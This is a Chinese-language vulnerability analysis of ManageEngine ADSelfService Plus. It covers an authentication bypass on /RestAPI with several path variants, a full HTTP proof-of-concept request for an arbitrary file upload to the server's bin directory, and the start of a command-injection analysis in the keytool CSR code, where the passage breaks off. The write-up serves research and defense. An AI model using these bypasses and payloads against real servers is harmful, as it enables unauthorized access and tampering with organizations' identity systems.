## 环境搭建
### 安装
该漏洞影响版本在`6113`版本以前，但是在官网上已经下载不到这个版本了，我在[其他网站](https://fs2.download82.com/software/bbd8ff9dba17080c0c121804efbd61d5/manageengine-
adselfservice-plus/ManageEngine_ADSelfService_Plus_64bit.exe)下载了5.8的版本进行分析。
下载好后双击exe安装，但启动过程中会卡在一个地方不动，后来我是通过双击`bin/run.bat`解决的，需要注意在选择版本的时候选择`free`版本。启动后的界面如下：
### 调试
看启动过程这个系统也是基于tomcat，tomcat的调试是在`catalina.bat`中加上调试信息，但是这个系统似乎没有`catalina.bat`文件。在`run.bat`中加上下面的内容。
## 漏洞分析
### 认证绕过
#### POC
/./RestAPI/LicenseMgr
#### 原理分析
这里可以看到是请求`RestAPI`接口时的绕过，查看`web.xml`文件，访问`RestAPI/`下的内容会被`struts`处理。
            action
            org.apache.struts.action.ActionServlet
            ...
            1
        action
        /RestAPI/*
在`webapps/adssp/WEB-INF/api-struts-config.xml:43`中找到`LicenseMgr`的处理类。
在`LicenseMgr`中没有找到明显的操作方法，因此在父类的`DispatchAction#execute`方法打断点，通过执行上面的`payload`拿到调用栈。
如果没有加上`/./`绕过，则不会执行到这个方法，所以推测是在`Filter`中做了权限认证的处理。这个系统配置的`Filter`并不多，因此我过了下发现问题主要在`ADSFilter#doFilter`中，如果没有加`/./`则会直接返回。
通过上面的代码分析，同时满足下面两个条件才会`return`，所以我们只要绕过一个即可。
  * `reqURI`可以被`/RestAPI/*`匹配到
  * `RestAPIFilter.doAction`返回false  
很明显使用`/./`是绕过了正则匹配的部分。
前面提到了这个系统是使用了`tomcat`，所以其实绕过的方法就比较多样了。
    /xxxx/../RestAPI/LicenseMgr
    /;asdassd/RestAPI/LicenseMgr
    /xxx;asdassd/../RestAPI/LicenseMgr
    /RestAPI;/LicenseMgr
### 文件上传
#### POC
执行成功后会在`/bin`下创建`test.txt`文件
    POST /./RestAPI/LogonCustomization HTTP/1.1
    Host: 192.168.3.16:8888
    Pragma: no-cache
    Cache-Control: no-cache
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: confluence.browse.space.cookie=space-templates; adscsrf=c7cd8c01-87c0-493d-841b-08dab9b51b30; JSESSIONIDADSSP=E332DAC8F8DCA73F0A99581A22D3ED36
    Connection: close
    Content-Type: multipart/form-data; boundary=---------------------------39411536912265220004317003537
    Content-Length: 749
    -----------------------------39411536912265220004317003537
    Content-Disposition: form-data; name="methodToCall"
    unspecified
    -----------------------------39411536912265220004317003537
    Content-Disposition: form-data; name="Save"
    yes
    -----------------------------39411536912265220004317003537
    Content-Disposition: form-data; name="form"
    smartcard
    -----------------------------39411536912265220004317003537
    Content-Disposition: form-data; name="operation"
    Add
    -----------------------------39411536912265220004317003537
    Content-Disposition: form-data; name="CERTIFICATE_PATH"; filename="adasdas/.././astest.txt"
    Content-Type: application/octet-stream
    arbitrary content
    -----------------------------39411536912265220004317003537--
#### 原理分析
`Struts-config.xml`存在如下配置:
通过配置+POC可知，调用的是`unspecified`方法,由于`form`传入的是`smartcard`，因此会进入到`else if`的内容中。
    public ActionForward unspecified(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response) throws Exception {
        ...
                if (request.getParameter("Save") != null) {
                    message = rb.getString("adssp.common.text.success_update");
                    messageType = "success";
                    if ("mob".equalsIgnoreCase(request.getParameter("form"))) {
                        this.saveMobileSettings(logonList, request);
                        request.setAttribute("form", "mob");
                    } 
                    //进入到下面的处理中
                    else if ("smartcard".equalsIgnoreCase(request.getParameter("form"))) {
                        operation = request.getParameter("operation");
                        SmartCardAction sCAction = new SmartCardAction();
                        if (operation.equalsIgnoreCase("Add")) {
                            request.setAttribute("CERTIFICATE_FILE", ClientUtil.getFileFromRequest(request, "CERTIFICATE_PATH"));
                            request.setAttribute("CERTIFICATE_NAME", ClientUtil.getUploadedFileName(request, "CERTIFICATE_PATH"));
                            //处理SmartCardConfig文件
                            sCAction.addSmartCardConfig(mapping, dynForm, request, response);
                        } else if (operation.equalsIgnoreCase("Update")) {
                            sCAction.updateSmartCardConfig(mapping, form, request, response);
                        }
跟进到`SmartCardAction#addSmartCardConfig`中，调用了`getFileFromRequest`
`getFileFromRequest`从Form表单中解析得到文件名和内容进行上传。
在已经拿到POC的情况下，可以看到文件上传漏洞的原理比较简单，那么下面我提出两个问题。
  * 这里在写入文件时明明只有文件名，为什么写入的文件会被上传到`bin`目录下？
这个问题可以通过分析`File#getAbsolutePath`的调用解决，`getAbsolutePath-->resolve-->getUserPath()-->System.getProperty("user.dir")`，而在当前环境中`System.getProperty("user.dir")`保存的是`/bin/`的地址，因此上传会传到/bin目录下。
    public String getAbsolutePath() {
            return fs.resolve(this);
        }
  * 我试图通过../等方式跨目录没有成功？为什么不能通过../实现跨目录上传？
FileName是通过`getFileName`获取的
`getFileName`调用`getBaseFileName`
`getBaseFileName`中通过`new File().getName()`获取文件名，所以我们传入的路径会被处理，这也是无法跨目录上传的原因。
### 命令执行
#### 原理分析
命令执行发生在`ConnectionAction#openSSLTool`中，这个函数中通过`createCSR`创建CSR文件。
    public ActionForward openSSLTool(ActionMapping actionMap, ActionForm actionForm, HttpServletRequest request, HttpServletResponse response) throws Exception {
            String action = request.getParameter("action");
            if (action != null && action.equals("generateCSR")) {
                SSLUtil.createCSR(request);
            }
            return actionMap.findForward("SSLTool");
        }
`createCSR`接收需要的参数放到`sslParams`这个json对象中，并继续通过重载方法完成实际的操作。
重载的`createCSR`方法中，接收参数拼接并调用`runCommand`方法执行命令，主要是通过调用`keytool.exe`生成证书文件。
    public static JSONObject createCSR(JSONObject sslSettings) throws Exception {
            //接收参数拼接命令
            String name = "\"" + sslSettings.getString("COMMON_NAME") + "\"";
            String pass = sslSettings.getString("PASSWORD");
            //keyToolEscape过滤
            pass = ClientUtil.keyToolEscape(pass);
            String password = "\"" + pass + "\"";